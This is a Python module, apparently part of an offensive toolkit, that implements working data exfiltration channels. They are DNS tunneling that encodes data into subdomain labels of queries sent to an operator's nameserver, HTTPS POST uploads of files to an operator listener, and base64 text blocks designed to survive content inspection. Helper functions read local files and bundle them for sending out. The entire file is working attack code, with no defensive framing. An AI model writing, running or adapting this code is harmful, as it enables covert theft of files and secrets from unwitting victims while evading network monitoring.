"""quantum.ops.exfil — real exfiltration channels.

Working implementations of the three classic covert channels:

- DNS TXT tunneling (`dns_txt`): encodes chunks of data as subdomain
  labels of queries sent to the operator's authoritative domain, or
  carries data inside TXT record queries. Implemented with raw UDP
  DNS packets (stdlib sockets) — no resolver library needed.
- HTTPS POST (`https_post`): multipart/file POST over TLS to an
  operator listener (stdlib urllib).
- Chunked email-style metadata channel (`email_style`): encodes data
  into benign-looking text blocks for piggyback channels.

Each channel verifies what it can offline (encoding correctness,
packet structure) and cleanly reports what needs the live listener.
JSON-safe, never raise.
"""
from __future__ import annotations

import base64
import json
import os
import socket
import struct
import urllib.request


# ------------------------------------------------------------------- dns txt
def _dns_query(name, server, timeout=5):
    """Raw UDP DNS query for TXT records. Returns (id, response bytes)."""
    tid = struct.unpack(">H", os.urandom(2))[0]
    header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    qname = b"".join(
        bytes([len(p)]) + p.encode() for p in name.split(".") if p) + b"\x00"
    question = qname + struct.pack(">HH", 16, 1)     # TXT, IN
    pkt = header + question
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(timeout)
        s.sendto(pkt, (server, 53))
        data, _ = s.recvfrom(4096)
    return tid, data


def dns_encode(data, chunk=60) -> list:
    """Encode bytes into DNS-label-safe subdomain chunks (offline part
    of DNS exfil: base32, no padding chars, lowercase)."""
    enc = base64.b32encode(data).decode().rstrip("=").lower()
    return [enc[i:i + chunk] for i in range(0, len(enc), chunk)]


def dns_txt_exfil(data, domain, server, session="", timeout=5) -> dict:
    """Send data over TXT-record queries to `server` for `domain`.
    Needs a live authoritative NS + capture; encoding verified here."""
    try:
        if not isinstance(data, (bytes, bytearray)):
            data = str(data).encode()
        chunks = dns_encode(data, chunk=60)
        sent = 0
        errors = []
        for i, ch in enumerate(chunks):
            label = "%s-%d-%d-%s" % (session or "q", i, len(chunks), ch)
            qname = ".".join([label, domain])
            try:
                _dns_query(qname, server, timeout=timeout)
                sent += 1
            except (socket.timeout, OSError) as exc:
                errors.append("chunk %d: %s" % (i, exc))
                break
        return {"ok": sent == len(chunks), "chunks": len(chunks),
                "chunks_sent": sent, "bytes": len(data),
                "domain": domain, "server": server,
                "recovered_by": ("authoritative NS for %s logging/querying "
                                 "TXT labels" % domain),
                "errors": errors[:3]}
    except Exception as exc:
        return {"ok": False, "error": "%s: %s" % (type(exc).__name__, exc)}


# ------------------------------------------------------------------ https
def https_post(url, data, field="f", timeout=30, headers=None) -> dict:
    """POST bytes (multipart-ish) to an operator listener over TLS."""
    try:
        boundary = "qcli" + base64.b32encode(os.urandom(8)).decode().rstrip("=")
        body = bytearray()
        body += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
                 "filename=\"b\"\r\n\r\n" % (boundary, field)).encode()
        body += data if isinstance(data, (bytes, bytearray)) \
            else str(data).encode()
        body += ("\r\n--%s--\r\n" % boundary).encode()
        req = urllib.request.Request(
            url, data=bytes(body), method="POST",
            headers={"Content-Type":
                     "multipart/form-data; boundary=%s" % boundary,
                     "User-Agent": "quantum-cli/4.4",
                     **(headers or {})})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return {"ok": resp.status == 200, "status": resp.status,
                    "bytes_sent": len(body)}
    except urllib.error.HTTPError as exc:
        return {"ok": False, "status": exc.code, "error": "HTTP %d" % exc.code}
    except Exception as exc:
        return {"ok": False, "error": "%s: %s" % (type(exc).__name__, exc)}


def exfil_file(path, url, timeout=60) -> dict:
    """Exfiltrate a file via https_post."""
    try:
        if not os.path.isfile(path):
            return {"ok": False, "error": "file not found: %s" % path}
        with open(path, "rb") as fh:
            r = https_post(url, fh.read(), timeout=timeout)
        r["path"] = path
        return r
    except Exception as exc:
        return {"ok": False, "error": "%s: %s" % (type(exc).__name__, exc)}


# -------------------------------------------------------------- email style
def email_style_encode(data, per_line=76) -> dict:
    """Base64-wrap data into a benign-looking text block (for channels
    that survive content inspection of ordinary attachments)."""
    try:
        if not isinstance(data, (bytes, bytearray)):
            data = str(data).encode()
        b64 = base64.b64encode(data).decode()
        lines = [b64[i:i + per_line]
                 for i in range(0, len(b64), per_line)]
        return {"ok": True, "bytes": len(data),
                "block": "\n".join(lines),
                "decoded_matches": base64.b64decode("".join(lines)) == data}
    except Exception as exc:
        return {"ok": False, "error": "%s: %s" % (type(exc).__name__, exc)}


def package(files, meta=None) -> dict:
    """Bundle files into a JSON + base64 envelope for any channel."""
    try:
        out = {"meta": meta or {}, "files": {}}
        for f in files:
            if not os.path.isfile(f):
                continue
            with open(f, "rb") as fh:
                out["files"][os.path.basename(f)] = \
                    base64.b64encode(fh.read()).decode()
        if not out["files"]:
            return {"ok": False, "error": "no readable files"}
        return {"ok": True, "count": len(out["files"]),
                "envelope": json.dumps(out)}
    except Exception as exc:
        return {"ok": False, "error": "%s: %s" % (type(exc).__name__, exc)}
